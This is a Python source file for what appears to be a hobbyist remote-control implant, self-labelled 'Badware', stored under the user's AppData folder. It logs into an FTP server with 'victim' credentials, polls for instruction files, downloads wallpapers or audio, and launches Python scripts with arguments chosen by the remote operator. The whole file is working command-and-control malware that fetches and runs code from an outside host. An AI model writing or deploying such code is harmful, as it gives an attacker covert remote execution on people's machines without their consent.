# sourcery skip: use-fstring-for-concatenation
import ftplib
import os
import time
time.sleep(5)
import subprocess
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
session = ftplib.FTP(server,'victim','victimpass1234')
while True:
    time.sleep(1)
    if "i.instruction" in session.nlst():
        if not "done" in session.nlst():
            session.retrbinary("RETR i.instruction", open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\instruction", 'wb').write)
            with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\instruction", "r") as f:
                inst = str(f.read()).split("_")
            if inst[0] == "wallpaper":
                session.retrbinary("RETR wallpaper.png", open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\wallpaper.png", 'wb').write)
            elif inst[0] == "play":
                session.retrbinary("RETR sentaud", open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\sentaud.wav", 'wb').write)
            with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\done", "x") as f:
                f.write("DONE")
            with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\done", "rb") as f:
                session.storbinary('STOR done', f)
            os.remove(fr"C:\users\{username}\AppData\Local\Aryan\Badware\done")
            try:
                l1 = [fr'C:\users\{username}\AppData\Local\Aryan\Badware\py\WPy64-31090\python-3.10.9.amd64\python.exe', fr"C:\users\{username}\AppData\Local\Aryan\Badware"+r"\\"+str(inst[0])+".py"]
                l2 = [fr'C:\users\{username}\AppData\Local\Aryan\Badware\py\WPy64-31090\python-3.10.9.amd64\python.exe', fr"C:\users\{username}\AppData\Local\Aryan\Badware"+r"\\"+str(inst[0])+".py"]
                l1.extend(inst[1:])
                subprocess.run(l1)
            except:
                subprocess.run(l2)
            if inst[0] == "handler":
                break
            os.remove(fr"C:\users\{username}\AppData\Local\Aryan\Badware\instruction")

session.quit()


